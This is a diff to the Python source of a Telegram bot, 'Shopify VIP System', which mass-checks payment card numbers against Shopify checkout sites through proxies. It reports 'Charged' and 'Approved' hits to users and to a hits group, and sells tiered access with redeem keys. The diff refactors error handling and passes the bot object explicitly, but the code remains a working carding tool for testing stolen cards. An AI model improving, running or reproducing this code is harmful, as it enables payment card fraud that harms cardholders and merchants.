@@ -1,6 +1,7 @@
-# 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮 - 𝘗𝘛𝘉 (𝘕𝘢𝘵𝘪𝘷𝘦 𝘊𝘰𝘭𝘰𝘳𝘴 - 𝘗𝘳𝘪𝘮𝘢𝘳𝘺 𝘉𝘭𝘶𝘦 𝘜𝘐) - 𝘡𝘦𝘳𝘰 𝘌𝘳𝘳𝘰𝘳 𝘗𝘳𝘰𝘵𝘰𝘤𝘰𝘭
+# 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮 - 𝘗𝘛𝘉 𝘗𝘶𝘳𝘦 (𝘕𝘢𝘵𝘪𝘷𝘦 𝘊𝘰𝘭𝘰𝘳𝘴 - 𝘗𝘳𝘪𝘮𝘢𝘳𝘺 𝘉𝘭𝘶𝘦 𝘜𝘐) - 𝘡𝘦𝘳𝘰 𝘌𝘳𝘳𝘰𝘳 𝘗𝘳𝘰𝘵𝘰𝘤𝘰𝘭
 import asyncio
 import aiohttp
+import aiofiles
 import os
 import random
 import time
@@ -15,6 +16,7 @@ from telegram.ext import (
     Application, CommandHandler, CallbackQueryHandler,
     MessageHandler, filters, ContextTypes
 )
+from telegram.error import RetryAfter, BadRequest, Forbidden
 
 from database2 import (
     init_db, ensure_user, get_user_plan, set_user_plan,
@@ -27,16 +29,16 @@ BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()
 
 _admin_env = os.getenv("ADMIN_ID", "8879293808")
 try: ADMIN_ID = [int(x.strip()) for x in _admin_env.split(",") if x.strip()]
-except: ADMIN_ID = [8879293808]
+except Exception: ADMIN_ID = [8879293808]
 
 try: JOIN_CHANNEL_ID = int(os.getenv("JOIN_CHANNEL_ID", "0"))
-except: JOIN_CHANNEL_ID = 0
+except Exception: JOIN_CHANNEL_ID = 0
 
 try: JOIN_GROUP_ID = int(os.getenv("JOIN_GROUP_ID", "0"))
-except: JOIN_GROUP_ID = 0
+except Exception: JOIN_GROUP_ID = 0
 
 try: HITS_GROUP_ID = int(os.getenv("HITS_GROUP_ID", "0"))
-except: HITS_GROUP_ID = 0
+except Exception: HITS_GROUP_ID = 0
 
 JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "https://t.me/hgffrrddrddf")
 JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "https://t.me/jonvhddrrd")
@@ -53,7 +55,6 @@ _SITE_ERRORS_COUNT = {}
 _MAX_SITE_ERRORS = 4
 _JOIN_CACHE = {}
 _MAINTENANCE_MODE = False
-bot_instance = None
 
 # ====================== VIP PREMIUM ASSETS ======================
 WELCOME_GIF = "https://media.giphy.com/media/3o7aD2d7hy9ktXNDP2/giphy.gif"
@@ -94,12 +95,12 @@ async def load_keys():
                 with open(KEYS_FILE, 'r', encoding='utf-8') as f:
                     content = f.read()
                     if content: return json.loads(content)
-            except: return {}
+            except Exception: return {}
         else:
             try:
                 with open(KEYS_FILE, 'w', encoding='utf-8') as f: f.write(json.dumps({}))
                 return {}
-            except: return {}
+            except Exception: return {}
     return {}
 
 async def save_keys(keys_data):
@@ -107,7 +108,7 @@ async def save_keys(keys_data):
         try:
             with open(KEYS_FILE, 'w', encoding='utf-8') as f:
                 f.write(json.dumps(keys_data, indent=4))
-        except: pass
+        except Exception: pass
 
 def get_cc_limit(plan, uid=0):
     if uid in ADMIN_ID: return 50000
@@ -122,6 +123,27 @@ def is_paid_plan(plan):
     return plan and plan.lower() in [p.lower() for p in PAID_TIERS]
 
 # ====================== CORE LOGIC & PTB UTILS ======================
+_GIF_CACHE = {}
+
+async def fetch_gif_to_memory(target_url):
+    if target_url in _GIF_CACHE:
+        gif_io = io.BytesIO(_GIF_CACHE[target_url])
+        gif_io.name = "vip.gif"
+        return gif_io
+    headers = {"User-Agent": "Mozilla/5.0", "Accept": "image/*,*/*;q=0.8"}
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(target_url, headers=headers, timeout=5) as response:
+                if response.status == 200:
+                    data = await response.read()
+                    if len(data) > 1024:
+                        _GIF_CACHE[target_url] = data
+                        gif_io = io.BytesIO(data)
+                        gif_io.name = "vip.gif"
+                        return gif_io
+    except Exception: pass
+    return None
+
 async def styled_reply(update: Update, text: str, buttons=None, use_gif=False, specific_gif=None):
     async with _MSG_LOCK:
         reply_markup = InlineKeyboardMarkup(buttons) if buttons else None
@@ -131,11 +153,16 @@ async def styled_reply(update: Update, text: str, buttons=None, use_gif=False, s
             gif_url = specific_gif or random.choice(ANIME_GIFS)
             try:
                 return await target_msg.reply_animation(animation=gif_url, caption=text, reply_markup=reply_markup, parse_mode="HTML")
-            except: pass
+            except RetryAfter as e:
+                await asyncio.sleep(e.retry_after + 1)
+            except Exception: pass
             
         try:
             return await target_msg.reply_text(text=text, reply_markup=reply_markup, parse_mode="HTML", disable_web_page_preview=True)
-        except: return None
+        except RetryAfter as e:
+            await asyncio.sleep(e.retry_after + 1)
+            return await target_msg.reply_text(text=text, reply_markup=reply_markup, parse_mode="HTML", disable_web_page_preview=True)
+        except Exception: return None
 
 async def styled_edit(msg, text, buttons=None):
     async with _EDIT_LOCK:
@@ -145,26 +172,28 @@ async def styled_edit(msg, text, buttons=None):
                 return await msg.edit_caption(caption=text, reply_markup=reply_markup, parse_mode="HTML")
             else:
                 return await msg.edit_text(text=text, reply_markup=reply_markup, parse_mode="HTML", disable_web_page_preview=True)
-        except: return None
+        except RetryAfter as e:
+            await asyncio.sleep(e.retry_after + 1)
+        except Exception: return None
 
-async def styled_send(chat_id, text, buttons=None, use_gif=False, specific_gif=None):
+async def styled_send(bot, chat_id, text, buttons=None, use_gif=False, specific_gif=None):
     async with _MSG_LOCK:
         reply_markup = InlineKeyboardMarkup(buttons) if buttons else None
         if use_gif or specific_gif:
             gif_url = specific_gif or random.choice(ANIME_GIFS)
             try:
-                return await bot_instance.send_animation(chat_id=chat_id, animation=gif_url, caption=text, reply_markup=reply_markup, parse_mode="HTML")
-            except: pass
+                return await bot.send_animation(chat_id=chat_id, animation=gif_url, caption=text, reply_markup=reply_markup, parse_mode="HTML")
+            except Exception: pass
         try:
-            return await bot_instance.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode="HTML", disable_web_page_preview=True)
-        except: return None
+            return await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode="HTML", disable_web_page_preview=True)
+        except Exception: return None
 
 _USER_HTTP_SESSIONS = {}
 async def get_user_http_session(uid):
     key = f"{uid}_msp"
     session = _USER_HTTP_SESSIONS.get(key)
     if session is None or session.closed:
-        connector = aiohttp.TCPConnector(limit=WORKERS + 10, ssl=False, enable_cleanup_closed=True)
+        connector = aiohttp.TCPConnector(limit=WORKERS + 10, ssl=False, enable_cleanup_closed=True, force_close=True)
         session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30, connect=10, sock_read=15), connector=connector)
         _USER_HTTP_SESSIONS[key] = session
     return session
@@ -174,7 +203,7 @@ async def cleanup_user_http_session(uid):
     session = _USER_HTTP_SESSIONS.pop(key, None)
     if session and not session.closed:
         try: await session.close()
-        except: pass
+        except Exception: pass
 
 def extract_cc(text):
     if not text: return []
@@ -232,18 +261,27 @@ async def get_github_sites():
                     text_data = await r.text()
                     _CACHED_SITES = list(set([re.sub(r'^https?://', '', line.strip()).rstrip('/') for line in text_data.split('\n') if line.strip()]))
                     _LAST_SITES_FETCH = now
-    except: pass
+    except Exception: pass
     if not _CACHED_SITES and os.path.exists('sites.txt'):
         try:
             with open('sites.txt', 'r', encoding='utf-8') as f:
                 _CACHED_SITES = list(set([re.sub(r'^https?://', '', line.strip()).rstrip('/') for line in f if line.strip()]))
-        except: pass
+        except Exception: pass
     return _CACHED_SITES
 
 def is_dead_site_error(error_msg):
     if not error_msg: return True
     _DEAD_INDICATORS = ('receipt id is empty', 'handle is empty', 'product id is empty', 'cloudflare', 'connection failed', 'timed out', 'empty reply from server', 'bad gateway', 'service unavailable', 'gateway timeout', 'site dead', 'proxy dead', 'session_error')
     return any(keyword in str(error_msg).lower() for keyword in _DEAD_INDICATORS)
+
+async def is_user_joined(uid, bot):
+    for chat_id in [JOIN_CHANNEL_ID, JOIN_GROUP_ID]:
+        if str(chat_id) in ["0", ""]: continue
+        try:
+            member = await bot.get_chat_member(chat_id, uid)
+            if member.status in ['left', 'kicked', 'banned']: return False
+        except Exception: return False
+    return True
 
 async def is_maintenance(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
@@ -264,15 +302,7 @@ async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     USER_LAST_REQ[uid] = now
     if uid in _JOIN_CACHE and now - _JOIN_CACHE[uid] < 600: return True
     
-    joined = True
-    for chat_id in [JOIN_CHANNEL_ID, JOIN_GROUP_ID]:
-        if str(chat_id) in ["0", ""]: continue
-        try:
-            member = await context.bot.get_chat_member(chat_id, uid)
-            if member.status in ['left', 'kicked', 'banned']: joined = False
-        except: joined = False
-            
-    if joined:
+    if await is_user_joined(uid, context.bot):
         _JOIN_CACHE[uid] = now
         return True
     
@@ -298,7 +328,7 @@ async def get_bin_info(bin_code):
                         "brand": data.get("brand", "-"), "type": data.get("type", "-"), "level": data.get("level", "-"), "bank": data.get("bank", "-"),
                         "country": data.get("country_name", "-"), "country_code": data.get("country", "-"), "flag": data.get("country_flag", "")
                     }
-    except: pass
+    except Exception: pass
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "-", "flag": ""}
 
 def format_card_result(status, card, gateway, response, price="-", bin_info=None, elapsed=0.0):
@@ -341,7 +371,7 @@ async def check_card_api(card, site, proxy, session, gateway_name):
             text_data = await resp.text()
             if resp.status != 200: return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card, 'retry': True}
             try: rj = json.loads(text_data)
-            except: return {'status': 'Site Error', 'message': 'Format Error', 'card': card, 'retry': True}
+            except Exception: return {'status': 'Site Error', 'message': 'Format Error', 'card': card, 'retry': True}
             
         response_msg = rj.get('Response', '')
         price = rj.get('Price', '-')
@@ -387,13 +417,13 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, max
     if last_result: return {'status': 'Dead', 'message': f'{str(last_result["message"])[:40]}', 'card': card, 'gateway': gateway_name, 'price': last_result.get('price', '-')}
     return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': gateway_name, 'price': '-'}
 
-async def _send_global_hit(status, gateway, message, price, uid):
+async def _send_global_hit(status, gateway, message, price, uid, bot):
     try:
         if str(HITS_GROUP_ID) in ["0", ""]: return
         try:
-            user = await bot_instance.get_chat(uid)
+            user = await bot.get_chat(uid)
             user_name = getattr(user, 'first_name', f"User {uid}")
-        except: user_name = f"User {uid}"
+        except Exception: user_name = f"User {uid}"
             
         plan = await get_user_plan(uid)
         plan_name = plan.title() if plan else "Free"
@@ -409,8 +439,8 @@ async def _send_global_hit(status, gateway, message, price, uid):
 ├ ⦗ 💬 ⦘ 𝘙𝘦𝘴𝘱𝘰𝘯𝘴𝘦 ⇾ <code>{message}</code>
 ╰ ⦗ 👤 ⦘ 𝘜𝘴𝘦𝘳 ⇾ <a href="tg://user?id={uid}">{user_name}</a> (<code>{plan_name}</code>)"""
 
-        await bot_instance.send_message(HITS_GROUP_ID, text, parse_mode="HTML", disable_web_page_preview=True)
-    except: pass
+        await bot.send_message(HITS_GROUP_ID, text, parse_mode="HTML", disable_web_page_preview=True)
+    except Exception: pass
 
 # ====================== COMMANDS HANDLERS (PTB) ======================
 async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -444,7 +474,6 @@ async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 ⦗ 💎 ⦘ 𝘠𝘰𝘶𝘳 𝘗𝘭𝘢𝘯 ⇾ <code>{plan.title() if plan else 'Bronze'} ({limit} 𝘓𝘪𝘮𝘪𝘵)</code>"""
     
-    # PTB Primary Style Buttons
     kb = [
         [InlineKeyboardButton("View Plans", callback_data="show_plans", style="primary")], 
         [InlineKeyboardButton("Channel", url=JOIN_CHANNEL_LINK, style="primary"), InlineKeyboardButton("Group", url=JOIN_GROUP_LINK, style="primary")]
@@ -519,7 +548,7 @@ async def feedback_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             else:
                 await context.bot.forward_message(chat_id=admin, from_chat_id=uid, message_id=msg.message_id)
                 await context.bot.send_message(admin, f"📩 <b>Feedback From:</b> <code>{uid}</code>", parse_mode="HTML")
-        except: pass
+        except Exception: pass
             
     await styled_reply(update, f"⦗ ✨ ⦘ 𝘠𝘰𝘶𝘳 𝘮𝘦𝘴𝘴𝘢𝘨𝘦 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘥𝘦𝘭𝘪𝘷𝘦𝘳𝘦𝘥 𝘵𝘰 𝘵𝘩𝘦 𝘖𝘸𝘯𝘦𝘳. 𝘛𝘩𝘢𝘯𝘬 𝘺𝘰𝘶!", use_gif=True)
 
@@ -528,12 +557,12 @@ async def check_joined_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     uid = query.from_user.id
     if uid in ADMIN_ID: return await query.answer("✅ Admin Access", show_alert=True)
-    if await is_user_joined(uid):
+    if await is_user_joined(uid, context.bot):
         await mark_user_joined(uid)
         await query.answer("✅ Verified!", show_alert=True)
         try: await query.message.delete()
-        except: pass
-        await styled_send(query.message.chat_id, f"⦗ ✨ ⦘ 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮\n╰ 𝘚𝘦𝘯𝘥 /start 𝘵𝘰 𝘷𝘪𝘦𝘸 𝘵𝘩𝘦 𝘮𝘦𝘯𝘶.", use_gif=True)
+        except Exception: pass
+        await styled_send(context.bot, query.message.chat_id, f"⦗ ✨ ⦘ 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮\n╰ 𝘚𝘦𝘯𝘥 /start 𝘵𝘰 𝘷𝘪𝘦𝘸 𝘵𝘩𝘦 𝘮𝘦𝘯𝘶.", use_gif=True)
     else:
         await query.answer("❌ Not joined yet!", show_alert=True)
 
@@ -612,7 +641,7 @@ async def remove_proxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await remove_proxy_by_index(uid, idx)
             await styled_reply(update, f"⦗ ✅ ⦘ 𝘗𝘳𝘰𝘹𝘺 𝘳𝘦𝘮𝘰𝘷𝘦𝘥.", use_gif=True)
         else: await styled_reply(update, f"⦗ 💎 ⦘ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘱𝘳𝘰𝘹𝘺 𝘯𝘶𝘮𝘣𝘦𝘳.", use_gif=True)
-    except: await styled_reply(update, f"⦗ 💎 ⦘ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘱𝘳𝘰𝘹𝘺 𝘯𝘶𝘮𝘣𝘦𝘳.", use_gif=True)
+    except Exception: await styled_reply(update, f"⦗ 💎 ⦘ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘱𝘳𝘰𝘹𝘺 𝘯𝘶𝘮𝘣𝘦𝘳.", use_gif=True)
 
 # ====================== REDEEM KEY ENGINE ======================
 async def generate_keys_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -700,8 +729,8 @@ async def redeem_key_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ├ ⦗ 💎 ⦘ 𝘗𝘭𝘢𝘯: <code>{tier}</code>
 ├ ⦗ ⏱ ⦘ 𝘋𝘶𝘳𝘢𝘵𝘪𝘰𝘯: <code>{days} 𝘋𝘢𝘺𝘴</code>
 ╰ ⦗ ⏳ ⦘ 𝘛𝘪𝘮𝘦: <code>{redeem_time}</code>"""
-        if ADMIN_ID: await styled_send(ADMIN_ID[0], admin_notification, use_gif=True)
-    except: pass
+        if ADMIN_ID: await styled_send(context.bot, ADMIN_ID[0], admin_notification, use_gif=True)
+    except Exception: pass
 
 async def validate_key_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMIN_ID: return
@@ -761,7 +790,7 @@ async def revoke_plan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     parts = update.message.text.split(maxsplit=1)
     if len(parts) < 2: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘢 𝘷𝘢𝘭𝘪𝘥 𝘐𝘋.", use_gif=True)
     try: target_uid = int(parts[1].strip())
-    except: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘢 𝘷𝘢𝘭𝘪𝘥 𝘐𝘋.", use_gif=True)
+    except Exception: return await styled_reply(update, f"⦗ 💎 ⦘ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘢 𝘷𝘢𝘭𝘪𝘥 𝘐𝘋.", use_gif=True)
     
     await set_user_plan(target_uid, "Free", 0)
     proc = ACTIVE_MTXT_PROCESSES.get(target_uid)
@@ -772,8 +801,8 @@ async def revoke_plan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
     admin_msg = f"⦗ 💎 ⦘ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘙𝘦𝘷𝘰𝘬𝘦𝘥\n├ ⦗ 👤 ⦘ 𝘜𝘴𝘦𝘳 ⇾ <code>{target_uid}</code>\n╰ ⦗ ⚡ ⦘ 𝘚𝘵𝘢𝘵𝘶𝘴 ⇾ <code>𝘋𝘦𝘮𝘰𝘵𝘦𝘥 𝘵𝘰 𝘍𝘳𝘦𝘦</code>"
     await styled_reply(update, admin_msg, use_gif=True)
-    try: await styled_send(target_uid, f"⦗ 💎 ⦘ 𝘚𝘺𝘴𝘵𝘦𝘮 𝘈𝘭𝘦𝘳𝘵\n\n╰ 𝘠𝘰𝘶𝘳 𝘝𝘐𝘗 𝘢𝘤𝘤𝘦𝘴𝘴 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘳𝘦𝘷𝘰𝘬𝘦𝘥 𝘣𝘺 𝘵𝘩𝘦 𝘢𝘥𝘮𝘪𝘯𝘪𝘴𝘵𝘳𝘢𝘵𝘰𝘳.", use_gif=True)
-    except: pass
+    try: await styled_send(context.bot, target_uid, f"⦗ 💎 ⦘ 𝘚𝘺𝘴𝘵𝘦𝘮 𝘈𝘭𝘦𝘳𝘵\n\n╰ 𝘠𝘰𝘶𝘳 𝘝𝘐𝘗 𝘢𝘤𝘤𝘦𝘴𝘴 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘳𝘦𝘷𝘰𝘬𝘦𝘥 𝘣𝘺 𝘵𝘩𝘦 𝘢𝘥𝘮𝘪𝘯𝘪𝘴𝘵𝘳𝘢𝘵𝘰𝘳.", use_gif=True)
+    except Exception: pass
 
 # ====================== FILE PROCESSING & MASS PROCESS ======================
 async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -792,7 +821,7 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
             
         if not await force_join_check(update, context): 
             try: await processing_msg.delete()
-            except: pass
+            except Exception: pass
             return
         
         plan = await get_user_plan(uid)
@@ -854,9 +883,9 @@ async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYP
     ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
     await styled_edit(msg_obj, f"⦗ ⚡ ⦘ 𝘗𝘳𝘦𝘱𝘢𝘳𝘪𝘯𝘨 𝘚𝘦𝘴𝘴𝘪𝘰𝘯...\n\n├ 𝘓𝘰𝘢𝘥𝘦𝘥: <code>{len(cards)} 𝘊𝘊𝘴</code>\n├ 𝘛𝘩𝘳𝘦𝘢𝘥𝘴: <code>{WORKERS}</code>\n╰ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: <code>{gate_name}</code>", buttons=None)
     
-    asyncio.create_task(_run_mass_process(update, msg_obj, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gate_name))
+    asyncio.create_task(_run_mass_process(update, msg_obj, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gate_name, context.bot))
 
-async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name):
+async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
     uid = update.effective_user.id
     total = len(cards); checked = charged = approved = insufficient = declined = errors = 0
     st = time.time()
@@ -889,7 +918,8 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                 [InlineKeyboardButton("🛑 Stop Process", callback_data=f"{stop_prefix}:{uid}", style="danger")]
             ]
             try: await styled_edit(msg_obj, dashboard_text, buttons=kb)
-            except: pass
+            except asyncio.CancelledError: break
+            except Exception: pass
 
     updater_task = asyncio.create_task(dashboard_updater())
     queue = asyncio.Queue()
@@ -900,7 +930,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
         nonlocal checked, charged, approved, insufficient, declined, errors, lcd
         while not queue.empty() and not is_stopped():
             try: card = queue.get_nowait()
-            except: break
+            except Exception: break
             
             try:
                 card_st = time.time()
@@ -916,19 +946,20 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                 
                 if status == 'Charged':
                     charged += 1
-                    asyncio.create_task(_send_mass_hit(card, "Charged", res.get('message', ''), res.get('price', '-'), gate_name, uid, card_el))
-                    asyncio.create_task(_send_global_hit("Charged", gate_name, res.get('message', ''), res.get('price', '-'), uid))
+                    asyncio.create_task(_send_mass_hit(card, "Charged", res.get('message', ''), res.get('price', '-'), gate_name, uid, card_el, bot))
+                    asyncio.create_task(_send_global_hit("Charged", gate_name, res.get('message', ''), res.get('price', '-'), uid, bot))
                 elif status == 'Approved':
                     approved += 1
-                    asyncio.create_task(_send_mass_hit(card, "Approved", res.get('message', ''), res.get('price', '-'), gate_name, uid, card_el))
+                    asyncio.create_task(_send_mass_hit(card, "Approved", res.get('message', ''), res.get('price', '-'), gate_name, uid, card_el, bot))
                 elif status == 'Insufficient':
                     insufficient += 1
-                    asyncio.create_task(_send_mass_hit(card, "Insufficient", res.get('message', ''), res.get('price', '-'), gate_name, uid, card_el))
-                    asyncio.create_task(_send_global_hit("Insufficient", gate_name, res.get('message', ''), res.get('price', '-'), uid))
+                    asyncio.create_task(_send_mass_hit(card, "Insufficient", res.get('message', ''), res.get('price', '-'), gate_name, uid, card_el, bot))
+                    asyncio.create_task(_send_global_hit("Insufficient", gate_name, res.get('message', ''), res.get('price', '-'), uid, bot))
                 elif status == 'Site Error': errors += 1
                 else: declined += 1
                 
-            except:
+            except asyncio.CancelledError: break
+            except Exception:
                 errors += 1
                 checked += 1
             finally:
@@ -958,19 +989,19 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     ]
     
     try: await styled_edit(msg_obj, final_text, buttons=fkb)
-    except: pass
+    except Exception: pass
     
     process_store.pop(uid, None)
     await cleanup_user_http_session(uid)
 
-async def _send_mass_hit(card, status, message, price, gateway, uid, elapsed):
+async def _send_mass_hit(card, status, message, price, gateway, uid, elapsed, bot):
     await asyncio.sleep(HIT_DELAY)
     try:
         bi = await get_bin_info(card.split("|")[0])
         msg = format_card_result(status, card, gateway, message, price, bi, elapsed)
         kb = [[InlineKeyboardButton("Owner", url="https://t.me/Dddadddyttt", style="primary")]]
-        await styled_send(uid, msg, buttons=kb, use_gif=True)
-    except: pass
+        await styled_send(bot, uid, msg, buttons=kb, use_gif=True)
+    except Exception: pass
 
 async def stop_chk_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -995,8 +1026,15 @@ async def check_sites_loop():
         await asyncio.sleep(600)
 
 async def post_init(app: Application):
+    print("🔄 Executing Webhook Killer Protocol...")
+    try:
+        await app.bot.delete_webhook(drop_pending_updates=True)
+        print("✅ Webhook destroyed. Polling path is clear.")
+    except Exception as e:
+        print(f"⚠️ Webhook note: {e}")
+        
     try: await init_db()
-    except Exception as e: print(f"DB Error: {e}")
+    except Exception as e: print(f"❌ DB Error: {e}")
     asyncio.create_task(check_sites_loop())
 
 def main():
